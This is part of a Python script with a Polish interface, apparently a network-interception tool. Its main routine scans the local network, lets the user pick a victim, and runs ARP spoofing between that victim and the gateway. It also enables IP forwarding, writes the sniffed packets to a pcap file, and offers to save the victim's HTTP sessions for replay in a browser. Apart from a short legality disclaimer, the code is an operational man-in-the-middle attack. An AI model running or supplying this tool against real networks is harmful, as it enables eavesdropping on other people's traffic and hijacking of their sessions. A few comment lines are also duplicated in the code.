{Colors.BOLD}{Colors.BLUE}=       PROGRAM DO PRZECHWYTYWANIA RUCHU SIECIOWEGO       ={Colors.END}
{Colors.BOLD}{Colors.BLUE}======================================================{Colors.END}
    """)

    # Ostrzeżenie o legalnym użyciu
    print(
        f"{Colors.RED}{Colors.BOLD}UWAGA: Ten program przeznaczony jest WYŁĄCZNIE do celów edukacyjnych i testowania zabezpieczeń.{Colors.END}")
    print(
        f"{Colors.RED}{Colors.BOLD}Użycie tego narzędzia bez zgody właściciela monitorowanej sieci/urządzeń jest nielegalne!{Colors.END}\n")

    # Sprawdź uprawnienia administratora
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        print(
            f"{Colors.RED}Ten program wymaga uprawnień administratora. Uruchom ponownie jako administrator.{Colors.END}")
        input("Naciśnij Enter, aby zakończyć...")
        sys.exit(1)

    # Wybór interfejsu
    interfaces = get_interfaces()
    if not interfaces:
        print(f"{Colors.RED}Nie znaleziono dostępnych interfejsów z adresami IP.{Colors.END}")
        input("Naciśnij Enter, aby zakończyć...")
        sys.exit(1)

    selected_interface = select_interface(interfaces)
    interface_name = selected_interface[0]
    interface_ip = selected_interface[1]

    # Skanowanie sieci
    network_range = get_network_range(interface_ip)
    hosts = scan_network(network_range)

    if not hosts:
        print(f"{Colors.RED}Nie znaleziono aktywnych hostów w sieci.{Colors.END}")
        input("Naciśnij Enter, aby zakończyć...")
        sys.exit(1)

    hosts = display_hosts(hosts)

    # Wybór celu
    target = select_target(hosts)
    print(f"\n{Colors.GREEN}Wybrany cel: {target['ip']} ({target['mac']}){Colors.END}")

    # Pobieranie informacji o bramie
    gateway = get_gateway()
    print(f"{Colors.GREEN}Brama domyślna: {gateway['ip']} ({gateway['mac']}){Colors.END}")

    # Nazwa pliku do zapisu
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    default_filename = f"captured_{target['ip'].replace('.', '_')}_{timestamp}.pcap"
    filename = input(f"\n{Colors.YELLOW}Podaj nazwę pliku do zapisu pakietów [{default_filename}]: {Colors.END}")

    if not filename:
        filename = default_filename

    # Uruchomienie przechwytywania w osobnych wątkach
    stop_event = threading.Event()

    # Wątek ARP spoofing
    arp_thread = threading.Thread(target=start_arp_spoofing, args=(target, gateway, stop_event))
    arp_thread.daemon = True
    arp_thread.start()

    # Włączenie forwardingu IP (aby pakiety były przekazywane dalej)
    if os.name == 'nt':
        try:
            os.system(
                "powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' -Name 'IPEnableRouter' -Value 1\"")
            # Sprawdź czy usługa RemoteAccess jest dostępna przed próbą jej restartu
            service_status = os.system("powershell -Command \"Get-Service RemoteAccess -ErrorAction SilentlyContinue\"")
            if service_status == 0:  # Jeśli usługa istnieje
                os.system("powershell -Command \"Restart-Service RemoteAccess -ErrorAction SilentlyContinue\"")
            print(f"{Colors.YELLOW}[*] Włączono przekazywanie IP{Colors.END}")
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Nie można włączyć przekazywania IP: {e}. Kontynuacja...{Colors.END}")
    else:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    try:
        # Uruchomienie przechwytywania w głównym wątku
        sniff_packets(interface_name, stop_event)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Zatrzymywanie przechwytywania...{Colors.END}")
    finally:
        # Zatrzymanie ARP spoofingu
        stop_event.set()
        arp_thread.join(timeout=3)

        # Wyłączenie forwardingu IP
        if os.name == 'nt':
            try:
                os.system(
                    "powershell -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' -Name 'IPEnableRouter' -Value 0\"")
                # Sprawdź czy usługa RemoteAccess istnieje przed próbą jej restartu
                service_status = os.system(
                    "powershell -Command \"Get-Service RemoteAccess -ErrorAction SilentlyContinue\"")
                if service_status == 0:  # Jeśli usługa istnieje
                    os.system("powershell -Command \"Restart-Service RemoteAccess -ErrorAction SilentlyContinue\"")
                print(f"{Colors.YELLOW}[*] Wyłączono przekazywanie IP{Colors.END}")
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Nie można wyłączyć przekazywania IP: {e}.{Colors.END}")
        else:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

        # Zapis przechwyconych pakietów
            # Zapis przechwyconych pakietów
            # Zapis przechwyconych pakietów
        if captured_packets:
            save_packets(filename)

            # Zapytaj o zapisanie sesji HTTP
            save_sessions = input(
                f"\n{Colors.YELLOW}Czy chcesz zapisać sesje HTTP do odtworzenia w przeglądarce? (t/n): {Colors.END}").lower()
            if save_sessions == 't' or save_sessions == 'tak':
                # Tworzenie nazwy katalogu na podstawie nazwy pliku PCAP
                output_dir = os.path.splitext(filename)[0] + "_sessions"
                save_http_sessions(captured_packets, output_dir)
        else:
            print(f"\n{Colors.YELLOW}Nie przechwycono żadnych pakietów.{Colors.END}")

        print(f"\n{Colors.GREEN}Program zakończony.{Colors.END}")


if __name__ == "__main__":
    try:
        # Dla Windows, dodaj import ctypes
        if os.name == 'nt':
            import ctypes
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Program przerwany przez użytkownika.{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}Wystąpił błąd: {e}{Colors.END}")

    input("Naciśnij Enter, aby zakończyć...")